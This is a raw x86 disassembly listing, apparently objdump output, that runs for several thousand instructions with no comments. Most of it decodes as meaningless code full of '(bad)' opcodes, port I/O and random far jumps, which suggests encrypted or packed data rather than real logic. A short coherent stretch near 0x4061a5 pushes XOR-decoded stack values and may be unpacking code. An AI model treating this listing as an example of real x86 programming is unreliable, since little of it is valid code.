  405c25:	inc    eax
  405c26:	(bad)  
  405c27:	sbb    eax,0x9a46f1e4
  405c2c:	jle    0x405bd2
  405c2e:	lahf   
  405c2f:	mov    dh,0x1f
  405c31:	jecxz  0x405c81
  405c33:	ds loope 0x405c96
  405c36:	retf   
  405c37:	ja     0x405c8c
  405c39:	daa    
  405c3a:	mov    ds:0xd940dc27,al
  405c3f:	lock imul ecx,DWORD PTR [edi],0x537da182
  405c46:	push   ebx
  405c47:	and    BYTE PTR [eax+0x60],0x22
  405c4b:	aaa    
  405c4c:	cwde   
  405c4d:	js     0x405c56
  405c4f:	das    
  405c50:	mov    ds:0x21da1883,eax
  405c55:	mov    esi,0x40c90ddb
  405c5a:	and    ebx,DWORD PTR ds:0xd3f47e56
  405c60:	cld    
  405c61:	mov    al,ds:0xe644bcaa
  405c66:	jmp    0x1a9a:0x867d8e21
  405c6d:	ret    
  405c6e:	cld    
  405c6f:	cmp    DWORD PTR [edx+0x41545d18],ecx
  405c75:	loopne 0x405cf5
  405c77:	inc    edx
  405c78:	xchg   esp,eax
  405c79:	mov    ds:0x93ee833d,al
  405c7e:	leave  
  405c7f:	sub    eax,0xffa7ac0c
  405c84:	push   edx
  405c85:	or     BYTE PTR [eax+0x37],0xe0
  405c89:	cld    
  405c8a:	in     al,0x1a
  405c8c:	pushf  
  405c8d:	dec    ebx
  405c8e:	add    ebx,DWORD PTR ds:0x28bcb646
  405c94:	scas   al,BYTE PTR es:[edi]
  405c95:	sbb    al,0xc8
  405c97:	nop
  405c98:	shl    DWORD PTR [esi],1
  405c9a:	dec    edi
  405c9b:	sbb    dh,BYTE PTR [edi]
  405c9d:	inc    eax
  405c9e:	xor    al,0x36
  405ca0:	jnp    0x405cc7
  405ca2:	add    eax,edx
  405ca4:	jnp    0x405ced
  405ca6:	popf   
  405ca7:	iret   
  405ca8:	js     0x405c5d
  405caa:	in     eax,dx
  405cab:	xchg   esp,eax
  405cac:	lahf   
  405cad:	inc    ecx
  405cae:	dec    esp
  405caf:	pop    esi
  405cb0:	fwait
  405cb1:	mov    ch,0x46
  405cb3:	jae    0x405cd4
  405cb5:	cmp    DWORD PTR [ebx+0x40],edx
  405cb8:	push   eax
  405cb9:	je     0x405c48
  405cbb:	xor    DWORD PTR [eax+0x38],0x54
  405cbf:	jle    0x405cdb
  405cc1:	jle    0x405c5c
  405cc3:	jge    0x405c6f
  405cc5:	push   ecx
  405cc6:	mov    esp,0x463ffd8a
  405ccb:	cmp    al,BYTE PTR [edi+edx*1+0x60c06e56]
  405cd2:	aam    0x9f
  405cd4:	push   edx
  405cd5:	clc    
  405cd6:	sub    BYTE PTR [eax+ebp*1-0x1e],0xe2
  405cdb:	sbb    eax,0x8f0e307
  405ce0:	jnp    0x405cb8
  405ce2:	mov    esp,0x328cf60d
  405ce7:	pusha  
  405ce8:	fsubp  st(6),st
  405cea:	dec    edi
  405ceb:	pop    edi
  405cec:	in     al,0x9a
  405cee:	jno    0x405d0f
  405cf0:	push   esi
  405cf1:	pop    ebp
  405cf2:	and    eax,0xf0b2cf1f
  405cf7:	mov    bl,0x21
  405cf9:	add    BYTE PTR ds:0x52b3ddca,bh
  405cff:	push   edi
  405d00:	aam    0xa2
  405d02:	push   ecx
  405d03:	pop    edx
  405d04:	mov    BYTE PTR [edx+ebx*2-0x1e],dh
  405d08:	(bad)  
  405d09:	push   ss
  405d0a:	xor    al,0x7b
  405d0c:	sti    
  405d0d:	setl   BYTE PTR [ecx]
  405d10:	and    DWORD PTR [esi-0xd],ecx
  405d13:	in     eax,0x1b
  405d15:	scas   eax,DWORD PTR es:[edi]
  405d16:	sub    ebx,DWORD PTR ds:0x67fd1cfa
  405d1c:	add    al,0x6c
  405d1e:	push   esi
  405d1f:	mov    edi,0x1b7f3366
  405d24:	cs gs out 0xb9,al
  405d28:	mov    bh,0x23
  405d2a:	sbb    edi,0x66
  405d2d:	sbb    edi,DWORD PTR [ebx+0x56]
  405d30:	and    eax,0x810e3e7a
  405d35:	repnz scas eax,DWORD PTR es:[edi]
  405d37:	test   al,0xd7
  405d39:	je     0x405cf1
  405d3b:	xchg   edi,eax
  405d3c:	lods   al,BYTE PTR ds:[esi]
  405d3d:	(bad)  
  405d3e:	adc    esp,DWORD PTR [edi+eax*1-0x72]
  405d42:	push   0x4eb963e5
  405d47:	add    BYTE PTR [eax],cl
  405d49:	push   esp
  405d4a:	loop   0x405d53
  405d4c:	dec    eax
  405d4d:	jmp    0xad619a0d
  405d52:	scas   al,BYTE PTR es:[edi]
  405d53:	shr    BYTE PTR [esi],1
  405d55:	rol    BYTE PTR [ebx-0x3d0aa2db],0x52
  405d5c:	xchg   esi,eax
  405d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d5e:	std    
  405d5f:	jb     0x405dcb
  405d61:	inc    esi
  405d62:	mov    edx,0x7369e33e
  405d67:	mov    bl,BYTE PTR [ebp-0x7aa5dd4b]
  405d6d:	cmp    dl,ch
  405d6f:	loope  0x405d30
  405d71:	inc    esi
  405d72:	fst    QWORD PTR [edi-0x1c8507e]
  405d78:	in     al,dx
  405d79:	xlat   BYTE PTR ds:[ebx]
  405d7a:	fmul   DWORD PTR [edi+edi*1]
  405d7d:	pop    ebx
  405d7e:	adc    BYTE PTR [ecx],0xb3
  405d81:	in     eax,dx
  405d82:	push   ebp
  405d83:	and    dh,BYTE PTR [edx-0x2a4a820f]
  405d89:	cmp    ecx,0xf81e79b3
  405d8f:	push   edx
  405d90:	imul   ecx,DWORD PTR cs:[ebx-0x7f740fbb],0xffffff98
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx-0x7563eca5],1
  405dbe:	test   eax,0x3747441f
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d6e
  405dca:	inc    edx
  405dcb:	push   edi
  405dcc:	jge    0x405d56
  405dce:	das    
  405dcf:	or     al,0x40
  405dd1:	or     ah,BYTE PTR [ebp-0x3d]
  405dd4:	loop   0x405dfe
  405dd6:	in     eax,dx
  405dd7:	cs sub BYTE PTR ss:[ecx],cl
  405ddb:	cmp    DWORD PTR [ebp-0x45dbba2e],ecx
  405de1:	mov    WORD PTR [edi],?
  405de3:	and    edx,DWORD PTR [ebp+0x29]
  405de6:	or     bh,BYTE PTR [ebx+edi*1]
  405de9:	sub    BYTE PTR [ecx-0x5da5b30c],ah
  405def:	mov    esp,edi
  405df1:	pop    ecx
  405df2:	xchg   ecx,eax
  405df3:	dec    edi
  405df4:	and    dl,BYTE PTR [ecx-0x7178a25f]
  405dfa:	pusha  
  405dfb:	and    ebp,DWORD PTR [esi+0x4c]
  405dfe:	sub    al,0x90
  405e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e01:	pop    esp
  405e02:	push   es
  405e03:	push   ss
  405e04:	push   0x36cc55f3
  405e09:	add    BYTE PTR [ebx+0x69],0x8c
  405e0d:	fsub   st,st(2)
  405e0f:	into   
  405e10:	jno    0x405d98
  405e12:	sbb    esp,esp
  405e14:	hlt    
  405e15:	aad    0x38
  405e17:	sub    bh,BYTE PTR [edx*1-0x1f4938ac]
  405e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1f:	mov    esp,0xb017adc9
  405e24:	out    dx,eax
  405e25:	add    eax,0x185f133a
  405e2a:	sbb    DWORD PTR ds:0xbedc4e3c,esp
  405e30:	bnd jnp 0x405e4e
  405e33:	out    dx,eax
  405e34:	test   BYTE PTR [ecx-0x7a],bh
  405e37:	ins    DWORD PTR es:[edi],dx
  405e38:	test   BYTE PTR ds:0xe89b3586,dl
  405e3e:	adc    edx,0xffffffc4
  405e41:	ret    0x7b12
  405e44:	lock mov ebp,0x8e13d4bc
  405e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e4b:	ret    
  405e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e4d:	xchg   edx,eax
  405e4e:	xor    dl,BYTE PTR [esi+0x22]
  405e51:	popf   
  405e52:	xchg   esi,eax
  405e53:	je     0x405ed1
  405e55:	leave  
  405e56:	hlt    
  405e57:	push   ebx
  405e58:	inc    ecx
  405e59:	mov    al,ds:0xbdc2a7c9
  405e5e:	test   eax,0xd2e3c27
  405e64:	jbe    0x405ecd
  405e66:	div    esi
  405e68:	push   ds
  405e69:	cdq    
  405e6a:	inc    esi
  405e6b:	cmp    esi,ecx
  405e6d:	stos   BYTE PTR es:[edi],al
  405e6e:	add    eax,0xdf2a751c
  405e73:	push   eax
  405e74:	scas   al,BYTE PTR es:[edi]
  405e75:	test   al,0x35
  405e77:	call   FWORD PTR ds:0xfd28ff19
  405e7d:	jp     0x405e37
  405e7f:	shl    BYTE PTR [esi],1
  405e81:	pop    ecx
  405e82:	jno    0x405e52
  405e84:	pop    ebx
  405e85:	sub    BYTE PTR [ebx],ch
  405e87:	in     al,0x77
  405e89:	xchg   ecx,eax
  405e8a:	aaa    
  405e8b:	stos   DWORD PTR es:[edi],eax
  405e8c:	dec    ebp
  405e8d:	add    BYTE PTR [eax],bh
  405e8f:	cmp    ebp,DWORD PTR cs:[esi+0x42]
  405e93:	cmp    al,0x8a
  405e95:	add    DWORD PTR [edi],eax
  405e97:	popf   
  405e98:	test   BYTE PTR [edi],0x26
  405e9b:	xchg   edi,eax
  405e9c:	add    eax,0x77d4b0a
  405ea1:	sub    al,0xed
  405ea3:	in     al,dx
  405ea4:	mul    DWORD PTR [edi]
  405ea6:	call   0x56d9c9b3
  405eab:	in     eax,dx
  405eac:	jge    0x405e7b
  405eae:	sbb    ah,BYTE PTR [edi]
  405eb0:	pop    ds
  405eb1:	std    
  405eb2:	xchg   edi,eax
  405eb3:	xchg   DWORD PTR [ebx],ecx
  405eb5:	mov    ah,0x62
  405eb7:	fimul  WORD PTR [eax+esi*4+0xbd1687]
  405ebe:	arpl   WORD PTR [esi],ax
  405ec0:	mov    bh,0xf7
  405ec2:	or     ebx,DWORD PTR [edi+0x8f95f3e]
  405ec8:	pop    ss
  405ec9:	fs push ebp
  405ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ecc:	(bad)  
  405ecd:	and    ch,al
  405ecf:	jle    0x405ec2
  405ed1:	mov    ch,0x27
  405ed3:	mov    ebp,DWORD PTR [esi-0x63ea01af]
  405ed9:	inc    esp
  405eda:	push   esp
  405edb:	mov    DWORD PTR [edi],edi
  405edd:	xchg   ebp,eax
  405ede:	pop    ss
  405edf:	xchg   bh,al
  405ee1:	cs repz jp 0x405e9f
  405ee5:	rcl    edx,0x79
  405ee8:	cmp    al,0xd3
  405eea:	aam    0xb6
  405eec:	ja     0x405efc
  405eee:	mov    DWORD PTR [ebx+0x1b],ecx
  405ef1:	int3   
  405ef2:	push   esi
  405ef3:	dec    edx
  405ef4:	(bad)  
  405ef5:	ret    
  405ef6:	sar    DWORD PTR [edi+0x74],cl
  405ef9:	sti    
  405efa:	scas   eax,DWORD PTR es:[edi]
  405efb:	lods   eax,DWORD PTR ds:[esi]
  405efc:	mov    bh,0x59
  405efe:	repz sub bl,ch
  405f01:	loop   0x405e8c
  405f03:	sub    DWORD PTR [ecx],eax
  405f05:	mov    ah,0x55
  405f07:	or     eax,0x8c745054
  405f0c:	mov    cl,0x9c
  405f0e:	xchg   esi,eax
  405f0f:	inc    eax
  405f10:	or     BYTE PTR [ebx],0x7e
  405f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f14:	int3   
  405f15:	push   esi
  405f16:	mov    al,0xa9
  405f18:	in     al,dx
  405f19:	inc    edi
  405f1a:	mov    dh,0x8a
  405f1c:	(bad)  
  405f1d:	shr    DWORD PTR [esi+0x89862b3],cl
  405f23:	mov    bl,0xca
  405f25:	not    BYTE PTR [edi+0x1c]
  405f28:	icebp  
  405f29:	pop    ecx
  405f2a:	push   cs
  405f2b:	jle    0x405ebb
  405f2d:	fsubr  st,st(4)
  405f2f:	inc    eax
  405f30:	inc    eax
  405f31:	mov    esi,0x5f2a24a9
  405f36:	stos   BYTE PTR es:[edi],al
  405f37:	call   0xf58da5d1
  405f3c:	jb     0x405f89
  405f3e:	pop    edx
  405f3f:	mov    ds:0x48f98ae2,eax
  405f44:	cli    
  405f45:	mov    cl,bl
  405f47:	sbb    BYTE PTR [ecx-0x7d5395ef],al
  405f4d:	pop    edi
  405f4e:	sbb    al,0xce
  405f50:	fprem  
  405f52:	hlt    
  405f53:	pop    esp
  405f54:	loopne 0x405fbc
  405f56:	in     eax,0x16
  405f58:	in     eax,0xfb
  405f5a:	arpl   WORD PTR [esi-0x61],sp
  405f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f5e:	xor    BYTE PTR [esi-0x63],bh
  405f61:	pop    es
  405f62:	push   cs
  405f63:	jl     0x405f23
  405f65:	(bad)  
  405f66:	int3   
  405f67:	adc    ebx,esi
  405f69:	sbb    al,0xc
  405f6b:	push   esp
  405f6c:	sar    BYTE PTR [ebx+eiz*8-0x13],cl
  405f70:	pop    ds
  405f71:	in     eax,dx
  405f72:	stc    
  405f73:	sub    al,0x72
  405f75:	pop    edx
  405f76:	fcomp  DWORD PTR [esi]
  405f78:	ficom  DWORD PTR [ebp-0x162bafda]
  405f7e:	ret    0x8adf
  405f81:	arpl   WORD PTR [ecx],sp
  405f83:	out    0x1c,al
  405f85:	ret    0x58f8
  405f88:	or     al,0x8d
  405f8a:	iret   
  405f8b:	jno    0x405fb4
  405f8d:	shl    BYTE PTR [edx+0x40],0x7
  405f91:	mov    dh,bh
  405f93:	jnp    0x405fb1
  405f95:	cmp    BYTE PTR [esi-0x17],ch
  405f98:	outs   dx,BYTE PTR es:[esi]
  405f9a:	mov    bl,0x27
  405f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f9d:	(bad)  
  405f9e:	jne    0x405fce
  405fa0:	and    eax,0x8968a9d9
  405fa5:	inc    ebp
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x3b]
  405fbf:	call   0x7e7e:0x359a08d9
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405ffc
  405fcb:	pop    ebp
  405fcc:	in     eax,0x4b
  405fce:	out    dx,eax
  405fcf:	inc    esp
  405fd0:	test   eax,0xf01e6403
  405fd5:	test   eax,0x2170d36
  405fda:	dec    eax
  405fdb:	out    dx,eax
  405fdc:	mov    bl,0x55
  405fde:	sbb    BYTE PTR [edi],0x35
  405fe1:	pop    ecx
  405fe2:	pop    esi
  405fe3:	lea    esp,[esi+0xd]
  405fe6:	xchg   edi,eax
  405fe7:	ret    
  405fe8:	nop
  405fe9:	sbb    edi,edi
  405feb:	rol    BYTE PTR [ecx+0xa03eb7],1
  405ff1:	cdq    
  405ff2:	retf   
  405ff3:	and    eax,0x11a577d9
  405ff8:	mov    esp,0xbde71042
  405ffd:	mov    edx,0xbcc555fe
  406002:	enter  0x2e82,0xda
  406006:	or     ah,BYTE PTR [ecx]
  406008:	push   0x38
  40600a:	jmp    0xcb2fd5b9
  40600f:	adc    edi,DWORD PTR [esi-0x4cdaa56c]
  406015:	loopne 0x40607e
  406017:	rol    DWORD PTR [ecx-0x7e1db3ba],0xd
  40601e:	das    
  40601f:	jae    0x405fca
  406021:	mov    dl,0xc6
  406023:	pop    esi
  406024:	xchg   DWORD PTR [esi-0x2fda1d40],ebx
  40602a:	cmp    al,BYTE PTR [ebx+0x5d1417d4]
  406030:	xchg   dl,bh
  406032:	inc    edx
  406033:	loope  0x405ff4
  406035:	and    BYTE PTR [esi+ebx*1-0x60],dl
  406039:	cwde   
  40603a:	aam    0xf5
  40603c:	in     eax,0xfb
  40603e:	mov    ch,0xc6
  406040:	inc    esp
  406041:	in     eax,dx
  406042:	inc    ebp
  406043:	push   cs
  406044:	xchg   esp,eax
  406045:	adc    eax,0xc593fe59
  40604a:	out    0x13,eax
  40604c:	jae    0x40605f
  40604e:	pop    edx
  40604f:	leave  
  406050:	ds (bad) 
  406052:	repnz xchg esp,eax
  406054:	fmul   st(1),st
  406056:	jecxz  0x406004
  406058:	inc    ecx
  406059:	aas    
  40605a:	call   0x7688:0xa2cb8ba3
  406061:	in     al,dx
  406062:	gs jno 0x406065
  406065:	(bad)
  406068:	in     eax,0xf
  40606a:	(bad)  
  40606b:	mov    eax,ds:0x340c265e
  406070:	outs   dx,DWORD PTR ds:[esi]
  406071:	mov    edx,0xd65ef177
  406076:	pusha  
  406077:	inc    ebp
  406078:	fsubr  st,st(1)
  40607a:	ja     0x406087
  40607c:	fcmovnb st,st(3)
  40607e:	or     al,BYTE PTR [ebx]
  406080:	inc    ebp
  406081:	xlat   BYTE PTR gs:[ebx]
  406083:	aam    0x80
  406085:	arpl   WORD PTR [edx-0x6a8fa41c],dx
  40608b:	(bad)  
  40608c:	loopne 0x40606a
  40608e:	test   ebp,ebp
  406090:	data16 and al,0xce
  406093:	addr16 iret 
  406095:	mov    cl,0xdd
  406097:	inc    ebp
  406098:	xor    cl,BYTE PTR [eax+0x5df3634f]
  40609e:	mov    bl,0x1a
  4060a0:	(bad)  
  4060a1:	pop    ecx
  4060a2:	leave  
  4060a3:	pop    esp
  4060a4:	xchg   ebp,eax
  4060a5:	sar    BYTE PTR [edx+0x7d],0xe1
  4060a9:	xor    eax,0xc7ba8f3a
  4060ae:	sbb    ch,al
  4060b0:	push   eax
  4060b1:	scas   eax,DWORD PTR es:[edi]
  4060b2:	cmp    dl,BYTE PTR [edi]
  4060b4:	inc    edi
  4060b5:	mov    cl,0x5f
  4060b7:	jle    0x4060bb
  4060b9:	shl    BYTE PTR [ebp-0x3171cd57],1
  4060bf:	test   DWORD PTR [edi+edx*1-0x50],ebp
  4060c3:	mov    ah,0x84
  4060c5:	dec    eax
  4060c6:	aas    
  4060c7:	dec    eax
  4060c8:	inc    ebp
  4060c9:	mov    ch,0x28
  4060cb:	fidiv  DWORD PTR [edi-0x64e9aba]
  4060d1:	cmp    DWORD PTR [edi-0x7fadd664],esi
  4060d7:	inc    edx
  4060d8:	mov    eax,0xc9edd0b1
  4060dd:	dec    ebp
  4060de:	cmp    BYTE PTR [ebp+0x6ec5ea77],cl
  4060e4:	shl    DWORD PTR [ebp-0x3],0xc5
  4060e8:	fnstsw WORD PTR [edi+edi*8]
  4060eb:	in     al,0x1c
  4060ed:	mov    WORD PTR [ebx],fs
  4060ef:	or     eax,0xedc1566b
  4060f4:	pop    esi
  4060f5:	mov    dh,0x55
  4060f7:	fldenv [ebp+ebx*2+0x4c5950c8]
  4060fe:	mov    ds:0x8233615a,al
  406103:	push   ss
  406104:	outs   dx,DWORD PTR ds:[esi]
  406105:	jno    0x40609c
  406107:	sub    al,0xb7
  406109:	rol    BYTE PTR [edi+0x7c],cl
  40610c:	inc    esp
  40610d:	mov    cl,0xc6
  40610f:	jnp    0x406130
  406111:	sti    
  406112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406113:	adc    al,0x99
  406115:	das    
  406116:	icebp  
  406117:	xor    esi,DWORD PTR [edx+0x7f0e50aa]
  40611d:	shr    eax,1
  40611f:	mov    esp,0x29102e82
  406124:	int3   
  406125:	sahf   
  406126:	pop    edi
  406127:	dec    edx
  406128:	xchg   ebp,eax
  406129:	adc    DWORD PTR [esi],eax
  40612b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40612c:	jbe    0x40618b
  40612e:	cs sbb al,0x4b
  406131:	pop    DWORD PTR [edi+0x29ab641d]
  406137:	ret    
  406138:	int    0x1e
  40613a:	xor    dh,BYTE PTR [edi]
  40613c:	into   
  40613d:	repnz addr16 call 0xc3b:0xb57d4db3
  406146:	stos   DWORD PTR es:[edi],eax
  406147:	and    cl,BYTE PTR [ecx]
  406149:	imul   edi,DWORD PTR [edx+ebp*4+0x5f],0x10
  40614e:	ror    edx,1
  406150:	and    bl,dl
  406152:	xchg   ebp,eax
  406153:	daa    
  406154:	xchg   ecx,eax
  406155:	mov    ebx,0xbce47667
  40615a:	ins    BYTE PTR es:[edi],dx
  40615b:	inc    edx
  40615c:	out    dx,al
  40615d:	in     al,0xa0
  40615f:	cmp    ch,BYTE PTR [esi-0x53]
  406162:	ss rcl ah,0x24
  406166:	imul   esi,DWORD PTR [edx+0x607c12a],0x134c5d04
  406170:	jb     0x406176
  406172:	daa    
  406173:	shr    DWORD PTR [esi-0xcb84ed9],1
  406179:	(bad)  [edi+0x121f2b10]
  40617f:	hlt    
  406180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406181:	jl     0x4061a1
  406183:	mov    eax,ds:0xf04c263b
  406188:	add    al,0x58
  40618a:	cmp    ch,bh
  40618c:	dec    ebp
  40618d:	cmp    DWORD PTR [ebp-0x72],edx
  406190:	rcr    edx,0x7e
  406193:	out    dx,eax
  406194:	imul   esp,DWORD PTR [edx],0x4578c0b9
  40619a:	fimul  WORD PTR [ecx+0x6cf1acc9]
  4061a0:	xor    BYTE PTR [ecx+0x12],al
  4061a3:	leave  
  4061a4:	out    dx,eax
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	pop    ecx
  4061d2:	imul   esi,edi,0x7e33f1ba
  4061d8:	jle    0x40622f
  4061da:	jg     0x40625a
  4061dc:	jle    0x40615f
  4061de:	jle    0x40622f
  4061e0:	mov    esp,0x9d2432df
  4061e5:	jmp    0x4061dd
  4061e7:	inc    ecx
  4061e8:	mov    eax,0x6e96763a
  4061ed:	xchg   esi,eax
  4061ee:	dec    ecx
  4061ef:	xchg   ebx,eax
  4061f0:	jae    0x406200
  4061f2:	adc    al,0x39
  4061f4:	push   eax
  4061f5:	(bad)  
  4061f6:	xchg   edx,eax
  4061f7:	inc    ebx
  4061f8:	add    al,0xd2
  4061fa:	loope  0x40622f
  4061fc:	gs daa 
  4061fe:	xor    eax,0x910301a9
  406203:	sti    
  406204:	ja     0x406207
  406206:	adc    esp,DWORD PTR [eax-0x6bdf7224]
  40620c:	and    DWORD PTR [esi-0x6d347ee0],eax
  406212:	jo     0x406288
  406214:	lods   eax,DWORD PTR ds:[esi]
  406215:	xchg   esp,eax
  406216:	retf   
  406217:	daa    
  406218:	mov    dh,0xf9
  40621a:	sahf   
  40621b:	pushf  
  40621c:	outs   dx,BYTE PTR ds:[esi]
  40621d:	ins    BYTE PTR es:[edi],dx
  40621e:	rcr    BYTE PTR [ecx+0x42d7bb31],cl
  406224:	pop    ebp
  406225:	mov    cl,bh
  406227:	repnz std 
  406229:	adc    eax,0x26a73aa8
  40622e:	jge    0x4061e9
  406230:	push   esi
  406231:	idiv   BYTE PTR [ebp-0x58]
  406234:	lds    esi,FWORD PTR [edx+0x43fc8997]
  40623a:	adc    BYTE PTR [edx+0x58be447e],dh
  406240:	iret   
  406241:	jne    0x4062b5
  406243:	dec    edi
  406244:	sub    al,0x64
  406246:	or     al,0xde
  406248:	imul   edx,DWORD PTR [ebx+edi*4],0x13828e13
  40624f:	popf   
  406250:	push   ds
  406251:	jg     0x406299
  406253:	in     eax,dx
  406254:	out    0x3f,eax
  406256:	cmp    eax,0x8c037843
  40625b:	mov    ds:0x15e25d59,eax
  406260:	and    al,0xee
  406262:	ds cs mov dh,0x18
  406266:	mov    esi,0x6b4c4cbc
  40626b:	(bad)  
  40626c:	cmc    
  40626d:	cmp    dh,bh
  40626f:	xchg   edi,eax
  406270:	add    al,0xcf
  406272:	loopne 0x40625d
  406274:	daa    
  406275:	xchg   ebx,eax
  406276:	and    ecx,ebx
  406278:	rol    DWORD PTR [edi-0x41],cl
  40627b:	jbe    0x40629e
  40627d:	mov    esi,esp
  40627f:	add    al,0x83
  406281:	lods   al,BYTE PTR ds:[esi]
  406282:	in     eax,0x5c
  406284:	jge    0x406269
  406286:	loope  0x4062b4
  406288:	test   BYTE PTR [esi+ebx*4+0xf],al
  40628c:	jbe    0x406255
  40628e:	lock stos DWORD PTR es:[edi],eax
  406290:	aaa    
  406291:	je     0x4062bd
  406293:	not    DWORD PTR [esi-0x3c]
  406296:	mov    cl,dl
  406298:	push   es
  406299:	push   esp
  40629a:	mov    bh,0x45
  40629c:	dec    esi
  40629d:	pop    ss
  40629e:	aam    0xdd
  4062a0:	adc    cl,dh
  4062a2:	adc    ch,ch
  4062a4:	sti    
  4062a5:	int    0xc7
  4062a7:	jp     0x4062eb
  4062a9:	lods   eax,DWORD PTR ds:[esi]
  4062aa:	xchg   DWORD PTR [ebp+0x43],edi
  4062ad:	dec    ebx
  4062ae:	inc    ecx
  4062af:	gs jecxz 0x406251
  4062b2:	and    al,0x78
  4062b4:	rdmsr  
  4062b6:	xor    al,BYTE PTR [esi-0x64]
  4062b9:	or     ah,cl
  4062bb:	fistp  WORD PTR [eax+0x17]
  4062be:	pop    edx
  4062bf:	test   BYTE PTR ds:0x188e3d77,dh
  4062c5:	push   es
  4062c6:	dec    edi
  4062c7:	adc    DWORD PTR [ebx],eax
  4062c9:	test   eax,0xbbd486d1
  4062ce:	xchg   esp,eax
  4062cf:	sbb    al,0xa
  4062d1:	nop
  4062d2:	scas   eax,DWORD PTR es:[edi]
  4062d3:	cs clc 
  4062d5:	xchg   DWORD PTR [eax-0x165696e3],eax
  4062db:	(bad)  
  4062dc:	cli    
  4062dd:	mov    WORD PTR [ecx-0x5],?
  4062e0:	loopne 0x40634e
  4062e2:	aas    
  4062e3:	(bad)  
  4062e5:	das    
  4062e6:	sar    DWORD PTR [ebx+0x6c],cl
  4062e9:	jmp    0xd03:0x51077994
  4062f0:	mov    ds:0x8243caa9,al
  4062f5:	adc    esi,DWORD PTR [ebx+0x14]
  4062f8:	lods   al,BYTE PTR ds:[esi]
  4062f9:	jb     0x406309
  4062fb:	into   
  4062fc:	ins    DWORD PTR es:[edi],dx
  4062fd:	cmp    eax,0x734225ca
  406302:	jl     0x406295
  406304:	inc    edx
  406306:	pop    esp
  406307:	ds mov edx,0xd9dc88c7
  40630d:	mov    edi,0xffa55d90
  406312:	push   ds
  406313:	test   BYTE PTR ds:0xaac36da4,0x3e
  40631a:	xor    esp,DWORD PTR [eax+0x442dbfb6]
  406320:	or     eax,0x41056f84
  406325:	fcom   QWORD PTR [esi+0x38]
  406328:	dec    esi
  406329:	push   ss
  40632a:	sub    ebp,DWORD PTR [ecx+0x2a8482b1]
  406330:	jb     0x406314
  406332:	jge    0x406394
  406334:	das    
  406335:	push   ebp
  406336:	call   0xd3bc:0x23acb0a4
  40633d:	jb     0x406355
  40633f:	ins    BYTE PTR es:[edi],dx
  406340:	sti    
  406341:	aaa    
  406342:	xchg   ebp,eax
  406343:	adc    ebx,DWORD PTR [ebp+0x31]
  406346:	push   ecx
  406347:	bound  edx,QWORD PTR [ecx+0x7a]
  40634a:	retf   
  40634b:	popf   
  40634c:	in     eax,dx
  40634d:	imul   esp,DWORD PTR [edx+0x456ea3c5],0xffffffd7
  406354:	adc    DWORD PTR [edi],ebx
  406356:	and    eax,0x95cb9050
  40635b:	fs ret 
  40635d:	mov    ecx,DWORD PTR [edi-0x10]
  406360:	js     0x4062f4
  406362:	into   
  406363:	sbb    BYTE PTR [esp+ebp*2+0x31],dl
  406367:	sbb    BYTE PTR [ecx],0x7e
  40636a:	add    DWORD PTR [edi+0x38],0xffffffbe
  40636e:	test   al,dh
  406370:	mov    dl,0xfc
  406372:	ins    DWORD PTR es:[edi],dx
  406373:	scas   al,BYTE PTR es:[edi]
  406374:	ficom  WORD PTR [edi+esi*2+0x29362211]
  40637b:	or     eax,0xe38eea9e
  406380:	scas   al,BYTE PTR es:[edi]
  406381:	push   ds
  406382:	dec    ebx
  406383:	and    ch,cl
  406385:	xlat   BYTE PTR ds:[ebx]
  406386:	mov    bh,0xfc
  406388:	cmp    DWORD PTR ds:0xf6673188,ebp
  40638e:	or     edx,ebp
  406390:	inc    esi
  406391:	hlt    
  406392:	(bad)  
  406393:	dec    ebx
  406394:	push   ebx
  406395:	dec    ebx
  406396:	xor    BYTE PTR [ebx+edx*4-0x1d],dl
  40639a:	jae    0x4063f1
  40639c:	out    dx,eax
  40639d:	jle    0x406400
  40639f:	cmp    dl,cl
  4063a1:	mov    eax,ss:0x6c7479ec
  4063a7:	neg    ebx
  4063a9:	loope  0x4063fe
  4063ab:	clc    
  4063ac:	shr    DWORD PTR [ebx-0x6e],cl
  4063af:	mov    al,ds:0x86d6f04b
  4063b4:	adc    dh,dh
